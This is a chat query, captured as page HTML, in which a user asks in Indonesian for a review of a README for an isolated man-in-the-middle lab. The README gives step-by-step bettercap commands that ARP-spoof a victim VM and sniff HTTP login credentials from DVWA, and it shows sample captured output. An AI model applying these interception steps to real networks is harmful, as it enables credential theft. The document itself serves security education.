screen-reader-user-query-label">Anda berkata</span><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> lakukan analisis keseluruhan apakah readme ini sudah benar ? : # 🔐 MITM Lab — Network Attack &amp; Detection Research <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted">
 &gt; **Disclaimer:** This lab is built strictly for **educational 
purposes** in a fully isolated virtual environment. All attacks are 
performed on intentionally vulnerable systems with no connection to 
production networks. Do not use these techniques on systems you do not 
own or have explicit written permission to test. <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> --- <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ## 📌 Overview <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted">
 A hands-on Man-in-the-Middle (MITM) attack lab built to study network 
interception, ARP spoofing, and credential sniffing in a controlled 
environment. The lab documents the full journey from failed attempts to 
successful interception, including root cause analysis of every obstacle
 encountered. <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted">
 **Core research question:** Can a containerized attacker (Docker) 
successfully intercept HTTP credentials between a victim VM and a 
vulnerable web application on an isolated Host-Only network? <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> **Result:** ✅ Yes — with `macvlan` network driver, bettercap container positioned correctly within the network topology. <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> --- <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ## 🏗️ Architecture <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ``` <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ┌─────────────────────────────────────────────────────┐ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted">
 │&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Kali 
Linux (Host)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; │ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted">
 │&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
192.168.56.1&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp;│ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted">
 │&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;│ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> │&nbsp; ┌─────────────────────────────────────────────┐&nbsp; &nbsp; │ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> │&nbsp; │&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Docker macvlan — mitm-net&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;│&nbsp; &nbsp; │ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted">
 │&nbsp; │&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;192.168.56.0/24&nbsp; &nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;│&nbsp; 
&nbsp; │ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted">
 │&nbsp; │&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp;│&nbsp; &nbsp; │ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> │&nbsp; │&nbsp; [bettercap]&nbsp; &nbsp; [DVWA]&nbsp; &nbsp;[WebGoat] [Juice]&nbsp; │&nbsp; &nbsp; │ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted">
 │&nbsp; │&nbsp; .56.10&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;.56.20&nbsp; 
&nbsp;.56.21&nbsp; &nbsp; .56.22&nbsp; &nbsp;│&nbsp; &nbsp; │ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> │&nbsp; └─────────────────────────────────────────────┘&nbsp; &nbsp; │ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted">
 │&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
vboxnet0&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp; &nbsp; &nbsp; &nbsp;│ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> └─────────────────────┬───────────────────────────────┘ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; │ Host-Only Network <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ┌───────────┴───────────┐ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; │&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;│ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; &nbsp;[Ubuntu VM]&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Metasploitable VM] <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; &nbsp;192.168.56.101&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;192.168.56.102 <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; &nbsp;victim&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;additional target <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ``` <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ### Network Design — Why macvlan? <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | Driver | MAC Address | Position | ARP Spoof | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> |--------|-------------|----------|-----------| <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | bridge (default) | shared via NAT | outside network | ✗ fails | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | host network | same as host vboxnet0 | same-interface problem | ✗ fails | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | **macvlan** | **unique per container** | **inside network** | **✓ works** | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted">
 The root cause of early failures was that `vboxnet0` on the Kali host 
has MAC `0a:00:27:00:00:00`. When bettercap ran on the host, ARP poison 
packets used this MAC — causing victims to route traffic to the host 
which then dropped it (same-interface routing problem). macvlan solves 
this by giving the bettercap container its own unique MAC and IP within 
the subnet. <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> --- <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ## 🧰 Components <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | Component | Role | IP | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> |-----------|------|----| <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | Kali Linux (host) | attacker host, Docker engine | 192.168.56.1 | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | bettercap (Docker) | ARP spoofer + traffic sniffer | 192.168.56.10 | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | DVWA (Docker) | HTTP target — login form | 192.168.56.20 | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | WebGoat (Docker) | HTTP target — web vulnerabilities | 192.168.56.21 | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | Juice Shop (Docker) | HTTP target — OWASP top 10 | 192.168.56.22 | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | Ubuntu VM | victim — browses to targets | 192.168.56.101 | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | Metasploitable VM | additional vulnerable target | 192.168.56.102 | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> --- <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ## 🚀 Quick Start <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ### Prerequisites <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> - VirtualBox installed on Kali Linux host <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> - Ubuntu VM configured with: Adapter 1 = NAT, Adapter 2 = Host-Only (vboxnet0) <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> - Metasploitable VM configured with: Adapter 1 = Host-Only (vboxnet0) <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> - Docker installed on Kali host <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> - vboxnet0 configured at 192.168.56.1/24 in VirtualBox settings <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ### 1 — Enable IP forwarding on Kali host <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ```bash <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> sudo sysctl -w net.ipv4.ip_forward=1 <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> sudo iptables -P FORWARD ACCEPT <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ``` <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ### 2 — Create macvlan network <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ```bash <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> docker network create \ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; --driver macvlan \ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; --subnet=192.168.56.0/24 \ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; --gateway=192.168.56.1 \ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; --opt parent=vboxnet0 \ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; mitm-net <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ``` <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ### 3 — Start target containers <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ```bash <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> docker compose -f docker/docker-compose.yml up -d <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ``` <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ### 4 — Initialize DVWA database <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> From Ubuntu VM browser, navigate to: <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ``` <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> http://192.168.56.20/setup.php <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ``` <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> Click **"Create / Reset Database"**, then login with `admin` / `password`. <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ### 5 — Launch bettercap attacker <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ```bash <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> docker run -it \ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; --name attacker \ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; --network mitm-net \ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; --ip 192.168.56.10 \ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; --cap-add NET_ADMIN \ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; --cap-add NET_RAW \ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; bettercap/bettercap \ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; -iface eth0 <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ``` <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ### 6 — Run the attack <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> Inside bettercap interactive shell: <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ``` <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> set arp.spoof.fullduplex true <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> set arp.spoof.internal true <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> set arp.spoof.targets 192.168.56.101,192.168.56.102 <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> arp.spoof on <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> set net.sniff.verbose true <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> set net.sniff.filter port 80 <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> net.sniff on <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ``` <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ### 7 — Trigger traffic from victim <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> From Ubuntu VM, open browser and login to: <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ``` <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> http://192.168.56.20/dvwa/login.php <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ``` <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ### Expected output <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ``` <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> [net.sniff.http.request] POST /login.php &lt;- 192.168.56.101 <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; username=admin&amp;password=password&amp;Login=Login&amp;user_token=xxxxx <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ``` <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> --- <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ## 🔍 Root Cause Analysis — Obstacles Encountered <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> Full RCA documentation is in [`docs/rca.md`](docs/rca.md). <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | # | Problem | Root Cause | Fix | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> |---|---------|-----------|-----| <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | 1 | No HTTP traffic captured | Docker bridge ≠ vboxnet0 subnet | Switch to macvlan driver | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | 2 | `Could not detect gateway` warning | Host-Only = isolated, no gateway | Expected behavior, non-blocking | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | 3 | Wrong target IPs in script | Copy-paste from 192.168.1.x config | Correct to 192.168.56.x | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | 4 | ARP table Ubuntu not changing | bettercap on host uses vboxnet0 MAC | Move bettercap to macvlan container | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted">
 | 5 | MAC `0a:00:27:00:00:00` kills internet | Host MAC used as spoof 
source, traffic dropped | macvlan gives container unique MAC | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | 6 | Only responses captured, no credentials | `net.sniff.verbose` not set | Add verbose + filter config | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | 7 | 302 → login.php (login fails) | DVWA database not initialized | Run setup.php first | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> | 8 | Duplicate log entries | `fullduplex=true` captures both directions | Expected behavior | <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> --- <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ## 📁 Repository Structure <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ``` <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> mitm-lab/ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ├── README.md&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # this file <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ├── docker/ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> │&nbsp; &nbsp;├── docker-compose.yml&nbsp; &nbsp; &nbsp;# all target containers <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> │&nbsp; &nbsp;└── bettercap.caplet&nbsp; &nbsp; &nbsp; &nbsp;# automated attack script <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ├── docs/ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> │&nbsp; &nbsp;├── rca.md&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# root cause analysis log <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> │&nbsp; &nbsp;├── topology.md&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # network diagram details <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> │&nbsp; &nbsp;└── planning.md&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # future roadmap <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ├── scripts/ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> │&nbsp; &nbsp;├── setup.sh&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# one-command lab setup <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> │&nbsp; &nbsp;└── teardown.sh&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # cleanup script <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> └── captures/ <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> &nbsp; &nbsp; └── .gitkeep&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# sample captures go here (gitignored) <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ``` <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> --- <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> ## ⚠️ Legal &amp; Ethical Notice <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted">
 This project is for **cybersecurity education only**. Every target in 
this lab is intentionally vulnerable software running in an isolated 
network with no internet access. The techniques demonstrated here: <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> - Are illegal if used against systems without explicit permission <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> - Are documented purely to understand how attacks work so defenders can detect and prevent them <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> - Should never be replicated outside a controlled lab environment <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"> --- <!----><!----></p><p _ngcontent-ng-c4043296955="" class="query-text-line ng-star-inserted"><!----><br _ngcontent-ng-c4043296955="" class="ng-star-inserted"><!----></p><p _ngcontent-ng-c4043296955="" 